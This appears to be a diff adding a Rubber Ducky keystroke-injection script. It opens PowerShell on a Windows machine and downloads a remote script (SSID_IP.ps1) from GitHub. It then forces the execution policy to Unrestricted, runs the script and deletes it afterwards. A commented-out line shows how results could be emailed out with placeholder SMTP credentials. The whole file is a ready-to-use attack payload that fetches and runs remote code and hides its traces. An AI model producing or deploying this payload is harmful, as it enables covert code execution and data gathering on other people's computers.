@@ -1,0 +1,16 @@
+GUI r
+DELAY 1000
+STRING powershell
+ENTER
+DELAY 1000
+STRING Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Fonta22/SSID_IP/main/SSID_IP.ps1" -OutFile "SSID_IP.ps1"
+ENTER
+DELAY 500
+STRING Set-ExecutionPolicy -Scope Process Unrestricted -force
+ENTER
+STRING .\SSID_IP
+ENTER
+DELAY 3000
+STRING rm .\SSID_IP.ps1
+ENTER
+REM Send-MailMessage -From "Bob <bob@example.com>" -To "Lee <lee.sanders@example.com>", "Zoe <zoe.dow@example.com>" -Subject "Sending the Attachment from PowerShell" -Body "The body of email goes here." -Attachment "invoice-001.pdf" -SmtpServer smtp.example.com -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "Your-username-goes-here", (ConvertTo-SecureString -String "replace-this-with-your-password" -AsPlainText -Force))
